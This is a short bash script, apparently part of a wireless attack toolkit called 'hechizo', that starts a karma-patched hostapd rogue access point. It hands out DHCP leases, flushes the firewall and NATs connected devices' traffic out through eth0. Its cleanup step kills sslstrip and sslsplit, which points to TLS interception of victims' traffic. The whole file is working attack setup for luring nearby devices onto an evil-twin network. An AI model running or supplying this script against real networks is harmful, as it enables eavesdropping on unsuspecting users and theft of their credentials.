#!/bin/bash

upstream=eth0
phy=wlan1
conf=/etc/hechizo/hostapd-karma.conf
hostapd=/usr/lib/hechizo/hostapd

service network-manager stop
rfkill unblock wlan

ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dhcpd -cf /etc/hechizo/dhcpd.conf $phy

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT

echo "Hit enter to kill me"
read
pkill dhcpd
pkill sslstrip
pkill sslsplit
pkill hostapd
pkill python
iptables -t nat -F
